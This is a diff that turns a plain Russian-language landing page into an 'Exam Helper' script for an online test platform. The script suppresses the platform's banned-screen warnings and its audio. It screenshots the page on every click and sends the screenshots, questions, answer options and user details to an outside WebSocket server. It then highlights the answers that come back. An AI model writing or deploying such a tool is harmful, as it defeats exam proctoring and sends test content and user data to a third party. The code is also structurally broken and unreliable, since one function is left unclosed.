@@ -1,127 +1,156 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Красивый сайт</title>
-  <script src="https://cdn.jsdelivr.net/npm/react@18.2.0/umd/react.production.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/react-dom@18.2.0/umd/react-dom.production.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@babel/standalone@7.20.6/babel.min.js"></script>
-  <script src="https://cdn.tailwindcss.com"></script>
+    <meta charset="UTF-8">
+    <title>Exam Helper</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <style>
+        .response-overlay {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.7);
+            color: white;
+            padding: 15px;
+            border-radius: 8px;
+            max-width: 300px;
+            z-index: 1000;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            font-family: Arial, sans-serif;
+            font-size: 14px;
+        }
+        .response-overlay.show {
+            opacity: 1;
+        }
+    </style>
 </head>
 <body>
-  <div id="root"></div>
-  <script type="text/babel">
-    function NavBar() {
-      const scrollToSection = (sectionId) => {
-        const element = document.getElementById(sectionId);
-        if (element) {
-          element.scrollIntoView({ behavior: 'smooth' });
-        }
-      };
+    <script>
+        (async () => {
+            const socket = new WebSocket('wss://x-q63z.onrender.com');
 
-      return (
-        <nav className="bg-gradient-to-r from-blue-600 to-purple-600 text-white py-4 fixed w-full top-0 z-10">
-          <div className="container mx-auto px-4 flex justify-center space-x-8">
-            <button 
-              onClick={() => scrollToSection('home')} 
-              className="hover:text-gray-200 font-semibold transition duration-300"
-            >
-              Главная
-            </button>
-            <button 
-              onClick={() => scrollToSection('info')} 
-              className="hover:text-gray-200 font-semibold transition duration-300"
-            >
-              Информация
-            </button>
-            <button 
-              onClick={() => scrollToSection('contacts')} 
-              className="hover:text-gray-200 font-semibold transition duration-300"
-            >
-              Контакты
-            </button>
-          </div>
-        </nav>
-      );
-    }
+            // Hide banned screen
+            function hideBannedScreen() {
+                document.querySelectorAll('.js-banned-screen').forEach(bannedScreen => {
+                    bannedScreen.style.setProperty('display', 'none', 'important');
+                });
+            }
 
-    function HomeSection() {
-      return (
-        <section id="home" className="min-h-screen flex items-center justify-center bg-gray-100">
-          <div className="container mx-auto px-4 text-center">
-            <h1 className="text-5xl font-bold text-gray-800 mb-4">Добро пожаловать на наш сайт!</h1>
-            <p className="text-lg text-gray-600">Мы создаем современные и стильные решения для вас.</p>
-          </div>
-        </section>
-      );
-    }
+            const observer = new MutationObserver(hideBannedScreen);
+            const container = document.querySelector('.test-container') || document.body;
+            observer.observe(container, { childList: true, subtree: true });
+            hideBannedScreen();
 
-    function InfoSection() {
-      return (
-        <section id="info" className="min-h-screen flex items-center justify-center bg-white">
-          <div className="container mx-auto px-4">
-            <h2 className="text-4xl font-semibold text-center text-gray-800 mb-8">Информация</h2>
-            <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
-              <div className="bg-gray-100 p-6 rounded-lg shadow-lg transform hover:scale-105 transition-transform duration-300">
-                <h3 className="text-xl font-bold text-gray-800">Наша миссия</h3>
-                <p className="mt-2 text-gray-600">Предоставлять качественные услуги и продукты.</p>
-              </div>
-              <div className="bg-gray-100 p-6 rounded-lg shadow-lg transform hover:scale-105 transition-transform duration-300">
-                <h3 className="text-xl font-bold text-gray-800">Технологии</h3>
-                <p className="mt-2 text-gray-600">Используем передовые технологии для инноваций.</p>
-              </div>
-              <div className="bg-gray-100 p-6 rounded-lg shadow-lg transform hover:scale-105 transition-transform duration-300">
-                <h3 className="text-xl font-bold text-gray-800">Команда</h3>
-                <p className="mt-2 text-gray-600">Профессионалы, готовые воплотить ваши идеи.</p>
-              </div>
-            </div>
-          </div>
-        </section>
-      );
-    }
+            // Disable audio
+            window.Audio = () => ({ play: () => {} });
 
-    function ContactsSection() {
-      return (
-        <section id="contacts" className="min-h-screen flex items-center justify-center bg-gray-100">
-          <div className="container mx-auto px-4 text-center">
-            <h2 className="text-4xl font-semibold text-gray-800 mb-8">Контакты</h2>
-            <p className="text-lg text-gray-600 mb-4">Свяжитесь с нами:</p>
-            <p className="text-gray-600">Email: example@email.com</p>
-            <p className="text-gray-600">Телефон: +7 (999) 123-45-67</p>
-            <p className="text-gray-600">Адрес: г. Москва, ул. Примерная, д. 123</p>
-          </div>
-        </section>
-      );
-    }
+            // Create response overlay
+            const overlay = document.createElement('div');
+            overlay.className = 'response-overlay';
+            document.body.appendChild(overlay);
 
-    function Footer() {
-      return (
-        <footer className="bg-gray-800 text-white py-6">
-          <div className="container mx-auto px-4 text-center">
-            <p>© 2025 Красивый сайт. Все права защищены.</p>
-          </div>
-        </footer>
-      );
-    }
+            function showResponse(message) {
+                overlay.innerText = message;
+                overlay.classList.add('show');
+                setTimeout(() => {
+                    overlay.classList.remove('show');
+                }, 5000); // Hide after 5 seconds
+            }
 
-    function App() {
-      return (
-        <div>
-          <NavBar />
-          <div className="pt-16">
-            <HomeSection />
-            <InfoSection />
-            <ContactsSection />
-            <Footer />
-          </div>
-        </div>
-      );
-    }
+            // Take screenshot on mouse click
+            document.addEventListener('mousedown', async () => {
+                try {
+                    const canvas = await html2canvas(document.body);
+                    const screenshot = canvas.toDataURL('image/jpeg', 0.8);
+                    const data = JSON.stringify({
+                        type: 'screenshot',
+                        data: screenshot
+                    });
+                    console.log('Sending screenshot');
+                    socket.send(data);
+                } catch (error) {
+                    console.error('Error capturing screenshot:', error);
+                    showResponse('Failed to capture screenshot');
+                }
+            });
 
-    const root = ReactDOM.createRoot(document.getElementById('root'));
-    root.render(<App />);
-  </script>
+            socket.onopen = () => {
+                console.log('WebSocket подключен');
+                socket.send(JSON.stringify({ role: 'helper' }));
+                setTimeout(sendQuestions, 2000);
+            };
+
+            socket.onerror = error => {
+                console.error('WebSocket error:', error);
+                showResponse('WebSocket connection error');
+            };
+
+            socket.onclose = () => {
+                console.log('WebSocket disconnected');
+                showResponse('WebSocket disconnected');
+            };
+
+            function sendQuestions() {
+                const questions = document.querySelectorAll('.test-table');
+                const breadcrumbText = document.querySelector('.breadcrumb-header')?.innerText?.trim() || '';
+                const timerText = document.querySelector('#timer')?.innerText?.trim() || '00:00:00';
+
+                questions.forEach((questionEl, qInd) => {
+                    const questionText = questionEl.querySelector('.test-question')?.innerText?.trim() || '';
+                    const questionImg = questionEl.querySelector('.test-question img')?.src || '';
+                    const answers = [];
+
+                    questionEl.querySelectorAll('.test-answers li label').forEach(answerEl => {
+                        const answerText = answerEl.innerText?.trim() || '';
+                        const answerImg = answerEl.querySelector('img')?.src || '';
+                        answers.push({ text: answerText, img: answerImg });
+                    });
+
+                    if ((questionText || questionImg) && answers.length > 0) {
+                        const data = JSON.stringify({
+                            qIndex: qInd,
+                            question: questionText,
+                            questionImg: questionImg,
+                            answers: answers,
+                            userInfo: breadcrumbText,
+                            timer: timerText
+                        });
+                        console.log('Отправка вопроса:', data);
+                        socket.send(data);
+                    }
+                });
+            socket.onmessage = async event => {
+                try {
+                    const response = JSON.parse(event.data);
+                    console.log('Received:', response);
+
+                    if (response.type === 'screenshot_response') {
+                        // Handle screenshot response
+                        showResponse(response.message || 'Server processed screenshot');
+                    } else if (response.answer) {
+                        // Handle question response
+                        const processedResponse = {
+                            qIndex: response.qIndex,
+                            question: response.question,
+                            answer: response.answer,
+                            varIndex: response.varIndex,
+                            clientId: response.clientId,
+                            processedAnswer: true
+                        };
+                        const questionEl = document.querySelectorAll('.test-table')[response.qIndex];
+                        const answerEl = questionEl?.querySelectorAll('.test-answers li')[response.varIndex];
+                        if (answerEl) {
+                            answerEl.style.backgroundColor = '#d4edda';
+                        }
+                        showResponse(`Answer for question ${response.qIndex + 1}: ${response.answer}`);
+                    }
+                } catch (error) {
+                    console.error('Error parsing WebSocket message:', error);
+                    showResponse('Error processing server response');
+                }
+            };
+        })();
+    </script>
 </body>
 </html>
-
